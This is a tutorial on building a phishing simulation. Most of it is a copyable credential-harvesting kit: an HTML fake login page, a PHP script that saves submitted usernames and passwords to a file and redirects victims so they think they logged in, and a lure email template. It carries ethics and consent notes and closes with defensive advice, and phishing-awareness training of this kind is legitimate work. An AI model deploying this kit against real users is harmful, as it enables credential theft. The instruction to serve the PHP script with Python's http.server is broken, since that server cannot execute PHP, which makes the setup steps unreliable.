# **Simulate Social Engineering Attacks: Phishing Simulation**

**Objective:**  
This project will guide you through creating and testing a phishing attack simulation to understand how attackers exploit human psychology to steal credentials. You’ll learn to set up a fake login page, send a phishing email, and analyze results. This project highlights the importance of defense strategies and user education.

## **What You’ll Need**

**Prerequisites:**
- **Basic knowledge of email and web technologies**: Familiarity with how web servers and HTML forms work.
- **Computer with internet access**
- **Web server or local development environment**: For hosting a mock phishing page.

---

## **Important Notes Before You Begin**

- **Ethics**: This simulation should be done in a controlled, ethical environment (e.g., a lab setting with informed consent from participants).
- **Legality**: Phishing attacks are illegal without permission. Do not attempt this outside an approved educational setting.

---

## **Step-by-Step Guide**

### **Step 1: Set Up a Phishing Page**

In this step, you’ll create a fake login page to simulate a phishing attack.

1. **Create a Simple Web Server**:
   - Use Python to quickly set up a web server that can host the phishing page.
   - Open a terminal, create a project directory, and move into it:
     ```bash
     mkdir phishing_simulation
     cd phishing_simulation
     ```

2. **Create a Phishing HTML Page**:
   - Make a new file called `index.html`, which will be the fake login page.
     ```bash
     nano index.html
     ```
   - Copy and paste the following code into `index.html`:
     ```html
     <!DOCTYPE html>
     <html lang="en">
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Fake Login Page</title>
     </head>
     <body>
       <h2>Login to Your Account</h2>
       <form action="capture.php" method="post">
         <label for="username">Username:</label>
         <input type="text" id="username" name="username"><br><br>
         <label for="password">Password:</label>
         <input type="password" id="password" name="password"><br><br>
         <input type="submit" value="Login">
       </form>
     </body>
     </html>
     ```
   - **Explanation**: This HTML form looks like a basic login page and collects a username and password.

3. **Create a PHP Script to Capture Credentials**:
   - Create a new file called `capture.php`, which will capture and store any login attempts made through the fake login page.
     ```bash
     nano capture.php
     ```
   - Copy the following PHP code into `capture.php`:
     ```php
     <?php
     $username = $_POST['username'];
     $password = $_POST['password'];
     $file = fopen("credentials.txt", "a");
     fwrite($file, "Username: " . $username . " Password: " . $password . "\n");
     fclose($file);
     header('Location: https://example.com'); // Redirect to a legitimate site after submission
     exit();
     ?>
     ```
   - **Explanation**:
     - This script takes the submitted username and password, writes them to a `credentials.txt` file, and then redirects the user to a legitimate site. This can trick a user into thinking they successfully logged in.

4. **Start the Web Server**:
   - Use Python to start a local web server on port 80 (or another port if needed).
     ```bash
     sudo python3 -m http.server 80
     ```
   - **Note**: Use `sudo` to run on port 80 (a restricted port), or use a higher port, like 8080, without `sudo`.

### **Step 2: Create a Phishing Email**

In this step, you’ll draft a phishing email to entice users into visiting the phishing page.

1. **Draft a Phishing Email**:
   - Open a text editor and write a simple phishing email that encourages the recipient to click the link and log in. Here’s an example:
     ```plaintext
     Subject: Important Security Update

     Dear User,

     We have detected unusual activity on your account. Please log in to verify your identity and secure your account.

     Click the link below to log in:
     http://your-local-ip-address/index.html

     Regards,
     Security Team
     ```
   - **Replace `your-local-ip-address` with your computer’s IP address** to make the link work.

2. **Send the Phishing Email**:
   - Use an email client or a local SMTP server to send the email.
   - **Important**: Only send this email to participants who have given informed consent for the simulation.

---

### **Step 3: Monitor and Analyze the Attack**

1. **Monitor for Captured Credentials**:
   - Check the `credentials.txt` file after participants enter information on the phishing page. This file will contain any usernames and passwords submitted.

2. **Analyze the Results**:
   - Evaluate the effectiveness of the phishing page and email. Did participants fall for the email? Were credentials entered? This analysis helps understand the effectiveness of phishing techniques.

---

### **Step 4: Implement Defenses Against Phishing**

Understanding how to recognize and protect against phishing attacks is essential. In this step, you’ll learn best practices to defend against these types of attacks.

1. **Educate Users**:
   - Conduct awareness sessions to teach users how to recognize phishing emails.
   - Explain common signs of phishing, such as:
     - **Urgent language** (“Your account will be deactivated unless…”)
     - **Suspicious links** (URLs that look unusual or don’t match the official website)
     - **Requests for sensitive information** (like passwords or personal information)
   
2. **Use Email Filtering Tools**:
   - Implement email filtering software that identifies and blocks phishing emails before they reach users.
   - Most email systems include spam filters and security features that can detect suspicious content.

3. **Enable Multi-Factor Authentication (MFA)**:
   - Enabling MFA requires users to enter a second form of verification, such as a code sent to their phone.
   - This adds an extra layer of security, even if a password is compromised.

4. **Regular Security Audits**:
   - Conduct regular audits and simulated phishing tests to identify vulnerabilities in user practices.
   - Penetration testing can help organizations find and fix security gaps before attackers exploit them.

---

### **Step 5: Document the Simulation and Findings**

1. **Phishing Simulation Setup**:
   - Document the steps taken to set up the phishing page, including the HTML and PHP code used.

2. **Phishing Email Content**:
   - Include the text of the phishing email sent to participants.

3. **Results and Analysis**:
   - Summarize the results, including how many participants fell for the phishing attempt.
   - Analyze patterns in responses to understand what made the phishing attempt effective or ineffective.

4. **Recommendations**:
   - Suggest ways to improve user security awareness and steps to mitigate phishing risks.
   - Highlight specific strategies (like those in Step 4) for protecting against phishing.

---

### **Conclusion**

By simulating a phishing attack, you’ve gained insights into the techniques used by attackers and the importance of defenses like user education, filtering tools, and MFA. Practicing these simulations in a controlled environment helps to better understand and defend against social engineering attacks. To further develop your skills, consider learning about other types of social engineering attacks and strategies for improving organizational security.
